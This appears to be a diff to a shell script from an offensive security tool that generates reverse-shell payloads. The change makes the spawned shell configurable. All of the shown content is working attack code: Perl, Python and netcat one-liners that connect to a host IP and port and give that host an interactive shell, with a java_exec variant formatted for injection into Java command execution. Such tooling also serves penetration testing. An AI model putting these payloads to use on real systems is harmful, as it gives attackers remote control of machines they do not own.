@@ -11,6 +11,9 @@ prepare_generic_linux_shell() {
     if [ -z "$host_ip" ]; then
         host_ip=$(get_host_ip)  # Function to get the host IP address
     fi
+    if [[ -z $default_shell ]]; then
+        default_shell="/bin/sh"
+    fi   
 }
 
 get_bash_reverse_shell() {
@@ -30,8 +33,7 @@ get_bash_reverse_shell() {
 
 get_perl_reverse_shell() {
     prepare_generic_linux_shell
-    local reverse_shell=''\''use Socket;$i="'"$host_ip"'";$p='"$host_port"';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'\'''
-
+    local reverse_shell=''\''use Socket;$i="'"$host_ip"'";$p='"$host_port"';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("'"$default_shell"' -i");};'\'''
     if [[ ! -z "$reverse_type" ]] && [[ $reverse_type == "java_exec" ]]; then
         reverse_shell=$(echo $reverse_shell | sed 's/"/\\"/g')
         reverse_shell="{\"perl\", \"-e\" , \"$reverse_shell\"}"
@@ -43,7 +45,7 @@ get_perl_reverse_shell() {
 }
 get_python_reverse_shell() {
     prepare_generic_linux_shell
-    local reverse_shell='import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'$host_ip'",'$host_port'));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.Popen(["/bin/sh","-i"]);'
+    local reverse_shell='import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'$host_ip'",'$host_port'));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.Popen(["'$default_shell'", "-i"]);'
     local python_exe=""
     if [[ -z $python_version ]]; then
         python_exe="python3"
@@ -66,9 +68,9 @@ get_python_reverse_shell() {
 
 get_nc_reverse_shell_simple() {
     prepare_generic_linux_shell
-    local reverse_shell='nc '"$host_ip"' '"$host_port"' -e /bin/sh'
+    local reverse_shell='nc '"$host_ip"' '"$host_port"' -e '"$default_shell"
     if [[ ! -z "$reverse_type" ]] && [[ $reverse_type == "java_exec" ]]; then
-        reverse_shell="{\"nc\", \"$host_ip\" , \"$host_port\", \"-e\", \"/bin/sh\"}"
+        reverse_shell="{\"nc\", \"$host_ip\" , \"$host_port\", \"-e\", \"$default_shell\"}"
     fi
     echo "$reverse_shell"
 }
